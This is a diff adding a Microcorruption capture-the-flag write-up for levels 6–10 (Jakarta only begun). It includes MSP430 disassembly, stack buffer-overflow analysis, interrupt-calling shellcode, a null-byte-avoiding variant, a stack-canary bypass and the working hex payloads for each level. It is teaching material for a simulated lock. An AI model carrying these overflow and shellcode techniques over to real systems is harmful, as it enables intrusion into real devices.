@@ -213,3 +213,185 @@ It looks like it's checking some part of my password and comparing it to
 r4=0x43fe, so 0x43fe-0x24 = 0x43da, which is the start of my password.  I enter
 1428 and click the hex input box, and the door unlocks!
 ### Level 6 / Whitehorse
+
+```
+44f4 <login>
+44f4:  3150 f0ff      add #0xfff0, sp
+44f8:  3f40 7044      mov #0x4470 "Enter the password to continue.", r15
+44fc:  b012 9645      call  #0x4596 <puts>
+4500:  3f40 9044      mov #0x4490 "Remember: passwords are between 8 and 16
+characters.", r15
+4504:  b012 9645      call  #0x4596 <puts>
+4508:  3e40 3000      mov #0x30, r14
+450c:  0f41           mov sp, r15
+450e:  b012 8645      call  #0x4586 <getsn>
+4512:  0f41           mov sp, r15
+4514:  b012 4644      call  #0x4446 <conditional_unlock_door>
+4518:  0f93           tst r15
+451a:  0324           jz  #0x4522 <login+0x2e>
+451c:  3f40 c544      mov #0x44c5 "Access granted.", r15
+4520:  023c           jmp #0x4526 <login+0x32>
+4522:  3f40 d544      mov #0x44d5 "That password is not correct.", r15
+4526:  b012 9645      call  #0x4596 <puts>
+452a:  3150 1000      add #0x10, sp
+```
+So again we're getting 0x30 bytes of input from getsn() and the stack pointer
+is being adjusted by 0x10 bytes at the end, so we should be able to do a buffer
+overflow.  The main difference is instead of unlock_door, we have
+conditional_unlock_door
+```
+4446 <conditional_unlock_door>
+4446:  0412           push  r4
+4448:  0441           mov sp, r4
+444a:  2453           incd  r4
+444c:  2183           decd  sp
+444e:  c443 fcff      mov.b #0x0, -0x4(r4)
+4452:  3e40 fcff      mov #0xfffc, r14
+4456:  0e54           add r4, r14
+4458:  0e12           push  r14
+445a:  0f12           push  r15
+445c:  3012 7e00      push  #0x7e
+4460:  b012 3245      call  #0x4532 <INT>
+4464:  5f44 fcff      mov.b -0x4(r4), r15
+4468:  8f11           sxt r15
+446a:  3152           add #0x8, sp
+446c:  3441           pop r4
+446e:  3041           ret
+```
+This function uses INT 0x7e, which only unlocks the door if the password is
+correct.  What we want is INT 0x7f, which unconditionally unlcoks the door.  
+Perhaps I can write shellcode to trigger 0x7f directly on the stack and then
+overwrite the return address with my address on the stack.
+To test this I entered 
+```
+PUSH 0X7F
+CALL 0X4532
+```
+in to the assembler and got 10127f0090123245 as the result.  I then ran it with
+414141414141414110127f00901232458788 as my input, and saw my PC was overwritten
+with 8887, and that my shellcode was at 0x3a80.  
+I modified my input to 414141414141414110127f0090123245803a and got an error
+about load address unaligned, but I was within my shellcode!
+Stepping through my shellcode, I saw that 0x7f was not being placed on the
+stack prior to my interrupt call.  Looking at the manual, I saw i should have
+had push #0x7f in the assembler to indicate that I wanted the value/constant
+0x7f; additionally, I needed to do the same for the call function.  After
+correction both of these, my input became 414141414141414130127f00b0123245803a,
+which unlocked the door!
+### Level 7 / Montevideo
+Quickly looking through the code, I see there is again a
+conditional_unlock_door, and that there is now a strcpy() and memset()
+functionality included.
+```
+44f4 <login>
+44f4:  3150 f0ff      add #0xfff0, sp
+44f8:  3f40 7044      mov #0x4470 "Enter the password to continue.", r15
+44fc:  b012 b045      call  #0x45b0 <puts>
+4500:  3f40 9044      mov #0x4490 "Remember: passwords are between 8 and 16
+characters.", r15
+4504:  b012 b045      call  #0x45b0 <puts>
+4508:  3e40 3000      mov #0x30, r14
+450c:  3f40 0024      mov #0x2400, r15
+4510:  b012 a045      call  #0x45a0 <getsn>
+4514:  3e40 0024      mov #0x2400, r14
+4518:  0f41           mov sp, r15
+451a:  b012 dc45      call  #0x45dc <strcpy>
+451e:  3d40 6400      mov #0x64, r13
+4522:  0e43           clr r14
+4524:  3f40 0024      mov #0x2400, r15
+4528:  b012 f045      call  #0x45f0 <memset>
+452c:  0f41           mov sp, r15
+452e:  b012 4644      call  #0x4446 <conditional_unlock_door>
+4532:  0f93           tst r15
+4534:  0324           jz  #0x453c <login+0x48>
+4536:  3f40 c544      mov #0x44c5 "Access granted.", r15
+453a:  023c           jmp #0x4540 <login+0x4c>
+453c:  3f40 d544      mov #0x44d5 "That password is not correct.", r15
+4540:  b012 b045      call  #0x45b0 <puts>
+4544:  3150 1000      add #0x10, sp
+4548:  3041           ret
+```
+getsn again allows 0x30 bytes to be used and stores the string at 0x2400.
+After the call to getsn, we see a call to strcpy, copying the input string to
+the sp.  After this, memset is clearing out 0x64 bytes starting at 0x2400.
+Since the strcpy() is unconditional, we can copy up to the 0x30 bytes that
+getsn allowed, which means we can overwrite the return address to gain
+execution, similar to what we did for previous levels. The difference is since
+strcpy() is being used, my shellcode can't contain any null bytes, since
+strcpy() stops copying once a null byte occurs.  The push #0x7f is the command
+that was introducing the null byte, since the word size is 2 bytes, 0x7f is
+really 0x007f.  There simple approach I took to avoid a null byte was to do:
+```
+mov #0x0180, r7
+sub #0x0101, r7 
+push r7
+call #0x454c (INT addr changed for this prog)
+```
+I entered my input 37408001378001010712b0124c454141ee43 and the door unlocked!
+### Level 8 /  Johannesburg
+"This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected."
+Uh oh.
+Looking at login() I see that there is now a test_password_valid function that
+exits out of the function if it returns false (presumably if the password is
+too long).  However, this is after the input is entered by getsn and copied
+with strcpy, so hopefully we can still just do a simple buffer overflow to win.
+At the end of strcpy() 0x12 is being added to sp.  getsn() allows 0x3f bytes to
+be copied.  
+I entered my long string and broke at the end of login, but my program did not
+reach there.
+Looking at the login() function I see the following snippet:
+```
+4574:  b012 f845      call  #0x45f8 <puts>
+4578:  f190 4000 1100 cmp.b #0x40, 0x11(sp)
+457e:  0624           jeq #0x458c <login+0x60>
+4580:  3f40 ff44      mov #0x44ff "Invalid Password Length: password too
+long.", r15
+4584:  b012 f845      call  #0x45f8 <puts>
+4588:  3040 3c44      br  #0x443c <__stop_progExec__>
+458c:  3150 1200      add #0x12, sp
+4590:  3041           ret
+```
+It looks like the program is checking for a stack canary, and if that value's
+not present, it is exiting out, before getting to the ret (the ret is what
+pop's our arbitrary addr off of the stack and gains us execution).  So, let's make sure that value is present on
+the stack!
+17 bytes in to our stack we need to have the value 0x40.  If the stack had been
+set up as it was on previous levels (with an add #0x12, sp before the ret) the
+17th byte would have been our return addr and would have complicated this
+exploit.
+Instead, this was basically the same as the previous label, but with the
+addition of needing to put the stack canary in.  I used the input
+37408001378001010712b012944541414140ec43 and unlocked the door!
+### Level 9 / Santa Cruz
+Looking through the code I see that unlock_door is now back as a function!
+There is now a test_username_and_password function.  Since the HSM only
+supports one value being stored, I'm guessing the either the username or
+password can be found in memory.
+sp = 0x43a0
+Username is called with getsn(0x2404, 0x63)
+Username is then strcpy'd to: 0x43a2
+password is called with getsn(0x2404, 0x63)
+password is then strcpy'd to: 0x43b5
+
+The end of login() has add 0x28, sp pop r4 and pop r11, so need to overwrite a
+return address 0x2c bytes off of stack, ox43cc or 34 bytes after the username
+or 23 bytes after the password.
+I decided to do some dynamic reverse engineering on this one since the login()
+function was so long.  I noticed that there were checks for the password
+length (min and max) but didn't appear to be any on the username.
+The maximum length value is stored at 0x43b4 (0x12 above the username) and the
+minimum length value is stored at 0x43b3 (0x11 above the username).  I should
+be able to overwrite those values to have an arbitrary length password!
+There is also a check for a null byte at 0x12 bytes above the password, so i
+need the password length to be 17 so strcpy() will place the null there.
+However, the username can still extend beyond that (since the username strcpy
+happens first).  After all of the username input, I'll overwrite the return
+addr with where I want to go.  Fortunately this program has the unlock_door
+function, so i'll simply overwrite the return addr with its value 0x444a.
+username - 414141414141414141414141414141414101ff41414141414141414141414141414141414343434343434a44
+password - 4242424242424242424242424242424242
+### Level 10 /  Jakarta
+Taking a look at the strings I see that username + password must be < 32.  In
+the code, I also see a string for password too long.  Perhaps this means
+there's not actually logic checking to see if my username is too long.
+
